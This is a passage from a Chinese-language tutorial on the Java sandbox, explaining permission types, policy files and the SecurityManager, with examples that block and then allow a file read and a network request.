class="comment">//权限类型+权限名+允许的操作</span></span><br></pre></td></tr></table></figure><p> 标准权限如下表：</p><table><thead><tr><th>说明</th><th>类型</th><th>权限名</th><th>操作</th><th>例子</th></tr></thead><tbody><tr><td>文件权限</td><td>java.io.FilePermission</td><td>文件名（平台依赖）</td><td>读、写、删除、执行</td><td>允许所有文件的读写删除执行：permission java.io.FilePermission “&lt;&lt; ALL FILES&gt;&gt;”, “read,write,delete,execute”;。允许对用户主目录的读：permission java.io.FilePermission “${user.home}/-“, “read”;</td></tr><tr><td>套接字权限</td><td>java.net.SocketPermission</td><td>主机名:端口</td><td>接收、监听、连接、解析</td><td>允许实现所有套接字操作：permission java.net.SocketPermission “:1-“, “accept,listen,connect,resolve”;。允许建立到特定网站的连接：permission java.net.SocketPermission “.abc.com:1-“, “connect,resolve”;</td></tr><tr><td>属性权限</td><td>java.util.PropertyPermission</td><td>需要访问的jvm属性名</td><td>读、写</td><td>读标准Java属性：permission java.util.PropertyPermission “java.”, “read”;。在sdo包中创建属性：permission java.util.PropertyPermission “sdo.”, “read,write”;</td></tr><tr><td>运行时权限</td><td>java.lang.RuntimePermission</td><td>多种权限名[见附录A]</td><td>无</td><td>允许代码初始化打印任务：permission java.lang.RuntimePermission “queuePrintJob”</td></tr><tr><td>AWT权限</td><td>java.awt.AWTPermission</td><td>6种权限名[见附录B]</td><td>无</td><td>允许代码充分使用robot类：permission java.awt.AWTPermission “createRobot”; permission java.awt.AWTPermission “readDisplayPixels”;</td></tr><tr><td>网络权限</td><td>java.net.NetPermission</td><td>3种权限名[见附录C]</td><td>无</td><td>允许安装流处理器：permission java.net.NetPermission “specifyStreamHandler”;。</td></tr><tr><td>安全权限</td><td>java.security.SecurityPermission</td><td>多种权限名[见附录D]</td><td>无</td><td></td></tr><tr><td>序列化权限</td><td>java.io.SerializablePermission</td><td>2种权限名[见附录E]</td><td>无</td><td></td></tr><tr><td>反射权限</td><td>java.lang.reflect.ReflectPermission</td><td>suppressAccessChecks（允许利用反射检查任意类的私有变量）</td><td>无</td><td></td></tr><tr><td>完全权限</td><td>java.security.AllPermission</td><td>无（拥有执行任何操作的权限）</td><td>无</td></tr></tbody></table><h4 id="代码源"><a href="#代码源" class="headerlink" title="代码源"></a>代码源</h4><p>代码源是类所在的位置，表示为URL地址。</p><h4 id="保护域"><a href="#保护域" class="headerlink" title="保护域"></a>保护域</h4><p>保护域用来组合代码源和权限，这是沙箱的基本概念。保护域就在于声明了比如由代码A可以做权限B这样的事情。</p><h4 id="策略文件"><a href="#策略文件" class="headerlink" title="策略文件"></a>策略文件</h4><p>策略文件是控制沙箱的管理要素，一个策略文件包含一个或多个保护域的项。策略文件完成了代码权限的指定任务，策略文件包括全局和用户专属两种。</p><p>JVM可以使用多个策略文件，不过一般来说下面两个最为常用。一个是全局的<code>$JREHOME/lib/security/java.policy</code>，作用于JVM的所有实例；另一个是用户自己的，可以存储到用户的主目录下。策略文件可以使用JDK自带的policytool工具编辑。</p><h5 id="java-policy"><a href="#java-policy" class="headerlink" title="java.policy"></a>java.policy</h5><p>我们看下默认的java.policy文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// Standard extensions get all permissions by default</span><br><span class="line"></span><br><span class="line">grant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;/*&quot; &#123;</span><br><span class="line">        permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// default permissions granted to all domains</span><br><span class="line"></span><br><span class="line">grant &#123;</span><br><span class="line">        // Allows any thread to stop itself using the java.lang.Thread.stop()</span><br><span class="line">        // method that takes no argument.</span><br><span class="line">        // Note that this permission is granted by default only to remain</span><br><span class="line">        // backwards compatible.</span><br><span class="line">        // It is strongly recommended that you either remove this permission</span><br><span class="line">        // from this policy file or further restrict it to code sources</span><br><span class="line">        // that you specify, because Thread.stop() is potentially unsafe.</span><br><span class="line">        // See the API specification of java.lang.Thread.stop() for more</span><br><span class="line">        // information.</span><br><span class="line">        permission java.lang.RuntimePermission &quot;stopThread&quot;;</span><br><span class="line"></span><br><span class="line">        // allows anyone to listen on dynamic ports</span><br><span class="line">        permission java.net.SocketPermission &quot;localhost:0&quot;, &quot;listen&quot;;</span><br><span class="line"></span><br><span class="line">        // &quot;standard&quot; properies that can be read by anyone</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor.url&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.class.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;os.name&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;os.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;os.arch&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;file.separator&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;path.separator&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;line.separator&quot;, &quot;read&quot;;</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.name&quot;, &quot;read&quot;;</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.name&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.name&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>策略文件的内容格式就是这样，grant授权允许操作某个权限。这个默认的策略文件就指明了JDK扩展包可以有全部权限，允许代码stop线程，允许监听1099端口(1099号端口，是默认的服务器端RMI监听端口)等等。</p><p><strong>配置基本原则：</strong></p><p>在启用安全管理器的时候，配置遵循以下基本原则：</p><ol><li>没有配置的权限表示没有。</li><li>只能配置有什么权限，不能配置禁止做什么。</li><li>同一种权限可多次配置，取并集。</li><li>统一资源的多种权限可用逗号分割。</li></ol><p><strong>默认配置文件解释：</strong></p><p>第一部分授权：授权基于路径在<code>file:$/*</code>的class和jar包，所有权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;/*&quot; &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第二部分授权：这是细粒度的授权，对某些资源的操作进行授权。具体不再解释，可以查看javadoc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant &#123; </span><br><span class="line">    permission java.lang.RuntimePermission &quot;stopThread&quot;;</span><br><span class="line">    ……   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>补充</strong>：当批量配置的时候（例如第一部分授权），有三种模式：</p><ul><li><code>directory/</code>表示directory目录下的所有.class文件，不包括.jar文件；</li><li><code>directory/*</code>表示directory目录下的所有的.class及.jar文件；</li><li><code>directory/-</code>表示directory目录下的所有的.class及.jar文件，包括子目录；</li></ul><p>　　可以通过<code>${}</code>来引用系统属性，如： <code>file:$/*</code></p><h5 id="java-security"><a href="#java-security" class="headerlink" title="java.security"></a>java.security</h5><p>另一个很重要的是参数文件——java.security，这个文件和策略文件在同一个目录下。这个参数文件定义了沙箱的一些参数。比如默认的沙箱文件是这样的，只截取部分内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># The default is to have a single system-wide policy file,</span><br><span class="line"># and a policy file in the user&apos;s home directory.</span><br><span class="line">policy.url.1=file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">policy.url.2=file:$&#123;user.home&#125;/.java.policy</span><br><span class="line"></span><br><span class="line"># whether or not we expand properties in the policy file</span><br><span class="line"># if this is set to false, properties ($&#123;...&#125;) will not be expanded in policy</span><br><span class="line"># files.</span><br><span class="line">policy.expandProperties=true</span><br><span class="line"></span><br><span class="line"># whether or not we allow an extra policy to be passed on the command line</span><br><span class="line"># with -Djava.security.policy=somefile. Comment out this line to disable</span><br><span class="line"># this feature.</span><br><span class="line">policy.allowSystemProperty=true</span><br></pre></td></tr></table></figure><p><code>policy.url.*</code>这个属性指明了使用的策略文件，如上文所述，默认的两个位置就在这里配置，用户可以自行更改顺序和存储位置。而policy.allowSystemProperty指明是否允许用户自行通过命令行指定policy文件。</p><h4 id="密钥库"><a href="#密钥库" class="headerlink" title="密钥库"></a>密钥库</h4><p>保存密钥证书的地方。</p><h3 id="默认沙箱"><a href="#默认沙箱" class="headerlink" title="默认沙箱"></a>默认沙箱</h3><p>通过Java命令行启动的Java应用程序，默认不启用沙箱。要想启用沙箱，启动命令需要做如下形式的变更：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager &lt;other args&gt;</span><br></pre></td></tr></table></figure><p>沙箱启动后，安全管理器会使用两个默认的策略文件来确定沙箱启动参数。当然也可以通过命令指定：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.policy=&lt;URL&gt;</span><br></pre></td></tr></table></figure><p>如果要求启动时只遵循一个策略文件，那么启动参数要加个等号，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.policy==&lt;URL&gt;</span><br></pre></td></tr></table></figure><h3 id="Java沙箱的应用"><a href="#Java沙箱的应用" class="headerlink" title="Java沙箱的应用"></a>Java沙箱的应用</h3><h4 id="限制读文件"><a href="#限制读文件" class="headerlink" title="限制读文件"></a>限制读文件</h4><p>这个例子很简单，首先写一个r.txt文件，里面的内容是“abcd”，再写个程序如下读取这个r.txt。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PolicyTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">file</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"D:\\github\\CDLib\\src\\main\\resources\\security\\r.txt"</span>);</span><br><span class="line">        InputStream is;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            is = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line">            <span class="keyword">byte</span>[] content = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> (is.read(content) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="keyword">new</span> String(content));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// test read file.</span></span><br><span class="line">        file();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现输出是<code>abcd</code>。</p><p>接下来修改Java启动参数，加入<code>-Djava.security.manager</code>，启动了安全沙箱。再运行，输出变成了异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.security.AccessControlException: access denied (&quot;java.io.FilePermission&quot; &quot;D:\github\CDLib\src\main\resources\security\r.txt&quot; &quot;read&quot;)</span><br><span class="line">at java.security.AccessControlContext.checkPermission(Unknown Source)</span><br><span class="line">at java.security.AccessController.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkRead(Unknown Source)</span><br><span class="line">at java.io.FileInputStream.(Unknown Source)</span><br><span class="line">at com.taobao.cd.security.PolicyTest.main(PolicyTest.java:15)</span><br></pre></td></tr></table></figure><p>这里已经提示了，访问被拒绝，说明了沙箱启动，同时也验证了默认沙箱——禁止本地文件访问。</p><p>再来，我们构建一个custom.policy文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.io.FilePermission &quot;D:\\github\\CDLib\\src\\main\\resources\\security\\*&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里构建了一条安全策略——允许读取security目录下的文件。</p><p>修改启动命令，添加<code>-Djava.security.policy=D:\\github\\CDLib\\src\\main\\resources\\security\\custom.policy</code>，再执行，结果输出了<code>abcd</code>。</p><p>如上例。我们通过自定义policy文件修改了默认沙箱的安全策略，再通过启动参数开启沙箱模式。这样就可以构造我们自己想要的沙箱效果了。</p><h4 id="限制访问网络"><a href="#限制访问网络" class="headerlink" title="限制访问网络"></a>限制访问网络</h4><p>通过HttpClient访问<code>www.baidu.com</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.taobao.cd.http.util.HttpUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PolicyTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">network</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String text = HttpUtil.createHtmlText(<span class="string">"http://www.baidu.com"</span>, HttpUtil.UA);</span><br><span class="line">            System.out.println(text);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// test use network.</span></span><br><span class="line">        network();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启默认沙箱后，输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">java.security.AccessControlException: access denied (&quot;java.net.SocketPermission&quot; &quot;www.baidu.com&quot; &quot;resolve&quot;)</span><br><span class="line">at java.security.AccessControlContext.checkPermission(Unknown Source)</span><br><span class="line">at java.security.AccessController.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkPermission(Unknown Source)</span><br><span class="line">at java.lang.SecurityManager.checkConnect(Unknown Source)</span><br><span class="line">at java.net.InetAddress.getAllByName0(Unknown Source)</span><br><span class="line">at java.net.InetAddress.getAllByName(Unknown Source)</span><br><span class="line">at java.net.InetAddress.getAllByName(Unknown Source)</span><br><span class="line">at org.apache.http.impl.conn.DefaultClientConnectionOperator.resolveHostname(DefaultClientConnectionOperator.java:242)</span><br><span class="line">at org.apache.http.impl.conn.DefaultClientConnectionOperator.openConnection(DefaultClientConnectionOperator.java:130)</span><br><span class="line">at org.apache.http.impl.conn.AbstractPoolEntry.open(AbstractPoolEntry.java:149)</span><br><span class="line">at org.apache.http.impl.conn.AbstractPooledConnAdapter.open(AbstractPooledConnAdapter.java:121)</span><br><span class="line">at org.apache.http.impl.client.DefaultRequestDirector.tryConnect(DefaultRequestDirector.java:573)</span><br><span class="line">at org.apache.http.impl.client.DefaultRequestDirector.execute(DefaultRequestDirector.java:425)</span><br><span class="line">at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:820)</span><br><span class="line">at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:754)</span><br><span class="line">at org.apache.http.impl.client.AbstractHttpClient.execute(AbstractHttpClient.java:732)</span><br><span class="line">at com.taobao.cd.http.util.HttpUtil.createHtmlText(HttpUtil.java:38)</span><br><span class="line">at com.taobao.cd.security.PolicyTest.network(PolicyTest.java:15)</span><br><span class="line">at com.taobao.cd.security.PolicyTest.main(PolicyTest.java:45)</span><br></pre></td></tr></table></figure><p>根据错误提示，知道是访问socket没有权限。那么修改下policy，指定权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.net.SocketPermission &quot;www.baidu.com:1-&quot;, &quot;connect,resolve&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在指定权限文件下再运行，得到了正常的text形式的baidu首页的页面文档。权限策略成功。</p><h2 id="0x02-Java-Security-Manager"><a href="#0x02-Java-Security-Manager" class="headerlink" title="0x02 Java Security Manager"></a>0x02 Java Security Manager</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>作为Java沙箱的基本组成部分之一，Java安全管理器是核心API和操作系统之间的主要接口，主要用于实现权限控制。</p><p>安全管理器是一个允许应用实现一种安全策略的类。它允许一个应用去明确在执行一个可能安全或者敏感的操作之前，此操作是否允许在一个安全的上下文中被执行。应用可以同意或者拒绝执行操作。</p><h3 id="SecurityManager类方法"><a href="#SecurityManager类方法" class="headerlink" title="SecurityManager类方法"></a>SecurityManager类方法</h3><p>SecurityManager类包含许多以check开头命名的方法。Java库中的各种方法在执行一些敏感的操作时可以调用这些方法。对check方法典型的调用如下： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager security = System.getSecurityManager();</span><br><span class="line"><span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">security.checkXXX(argument);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SecurityManager通过抛出异常来阻止没有权限或敏感操作的完成。 如果操作被允许执行，则简单的返回；如果操作被拒绝，则抛出一个SecurityException。对于这种处理方式唯一的例外就是checkTopLevelWindow()方法，此方法返回boolean值。</p><p>设置、获取当前管理器：</p><ul><li>可以使用System类的setSecurityManager()方法来设置当前安全管理器；</li><li>可以使用System类的getSecurityManager()方法来获取当前安全管理器；</li></ul><p>SecurityManager中特定的方法checkPermission(java.security.Permission)负责明确允许还是拒绝由指定权限所指示的访问请求，默认的实现是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AccessController.checkPermission(perm);</span><br></pre></td></tr></table></figure><p>若果一个请求访问被允许，则checkPermission()直接返回；如果被拒绝，则抛出一个SecurityException异常。</p><p>从Java 2 SDK v1.2 开始，SecurityManager 中其他所有check方法的默认实现都是调用SecurityManager的checkPermission()方法来确定调用线程是否具有执行所请求操作的权限。</p><p>注意：只带有单个权限参数的checkPermission()方法总是在当前执行的线程上下文中执行安全检查。有时，应该在给定上下文中进行的安全检查实际上需要在不同的上下文（例如，在一个辅助线程中）中进行。Java为这种情况提供了包含有上下文参数的getSecurityContext()方法和checkPermission()方法。</p><p>getSecurityContext()方法返回当前调用上下文的一个“快照”（默认的实现返回一个 AccessControlContext 对象）。下面是一个示例调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Object context = <span class="keyword">null</span>;</span><br><span class="line">SecurityManager sm = System.getSecurityManager();</span><br><span class="line"><span class="keyword">if</span> (sm != <span class="keyword">null</span>) context = sm.getSecurityContext();</span><br></pre></td></tr></table></figure><p>checkPermission()方法使用一个上下文对象，以及根据该上下文而不是当前执行线程的上下文作出访问决策的权限。因此另一个上下文中的代码可以调用此方法，传递权限和以前保存的上下文对象。下面是一个示例调用，它使用了以前示例中获得的SecurityManager类实例sm：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sm != <span class="keyword">null</span>) sm.checkPermission(permission, context);</span><br></pre></td></tr></table></figure><p>SecurityManager类的主要方法列表如下，分别囊括了文件的读写删除和执行、网络的连接和监听、线程的访问、以及其他包括打印机剪贴板等系统功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">checkAccept(String, int)</span><br><span class="line">checkAccess(Thread)</span><br><span class="line">checkAccess(ThreadGroup)</span><br><span class="line">checkAwtEventQueueAccess()</span><br><span class="line">checkConnect(String, int)</span><br><span class="line">checkConnect(String, int, Object)</span><br><span class="line">checkCreateClassLoader()</span><br><span class="line">checkDelete(String)</span><br><span class="line">checkExec(String)</span><br><span class="line">checkExit(int)</span><br><span class="line">checkLink(String)</span><br><span class="line">checkListen(int)</span><br><span class="line">checkMemberAccess(Class&lt;?&gt;, int)</span><br><span class="line">checkMulticast(InetAddress)</span><br><span class="line">checkMulticast(InetAddress, byte)</span><br><span class="line">checkPackageAccess(String)</span><br><span class="line">checkPackageDefinition(String)</span><br><span class="line">checkPermission(Permission)</span><br><span class="line">checkPermission(Permission, Object)</span><br><span class="line">checkPrintJobAccess()</span><br><span class="line">checkPropertiesAccess()</span><br><span class="line">checkPropertyAccess(String)</span><br><span class="line">checkRead(FileDescriptor)</span><br><span class="line">checkRead(String)</span><br><span class="line">checkRead(String, Object)</span><br><span class="line">checkSecurityAccess(String)</span><br><span class="line">checkSetFactory()</span><br><span class="line">checkSystemClipboardAccess()</span><br><span class="line">checkTopLevelWindow(Object)</span><br><span class="line">checkWrite(FileDescriptor)</span><br><span class="line">checkWrite(String)</span><br></pre></td></tr></table></figure><h3 id="启动安全管理器"><a href="#启动安全管理器" class="headerlink" title="启动安全管理器"></a>启动安全管理器</h3><h4 id="参数启动"><a href="#参数启动" class="headerlink" title="参数启动"></a>参数启动</h4><p>启动程序的时候通过附加参数启动安全管理器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager</span><br></pre></td></tr></table></figure><p>如果想指定自定义的实现，可以在java.security.manager加等号指定，如下就能指定net.sourceforge.prograde.sm.ProGradeJSM作为实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager=net.sourceforge.prograde.sm.ProGradeJSM</span><br></pre></td></tr></table></figure><p>若要同时指定配置文件的位置那么示例如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.security.manager -Djava.security.policy=&quot;E:/java.policy&quot;</span><br></pre></td></tr></table></figure><p>策略文件前面小节已经说过了。一般需要指定哪些类有哪些权限，编辑policy文件就可以了。policy文件的具体语法参看<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html" target="_blank" rel="noopener">这里</a>。</p><h4 id="编码方式启动"><a href="#编码方式启动" class="headerlink" title="编码方式启动"></a>编码方式启动</h4><p>也可以通过编码方式启动，不过不建议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager sm = <span class="keyword">new</span> SecurityManager(); </span><br><span class="line">System.setSecurityManager(sm);</span><br></pre></td></tr></table></figure><p>通过参数启动，本质上也是通过编码启动，不过参数启动使用灵活。</p><h3 id="关闭安全管理器"><a href="#关闭安全管理器" class="headerlink" title="关闭安全管理器"></a>关闭安全管理器</h3><p>程序关闭：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager sm = 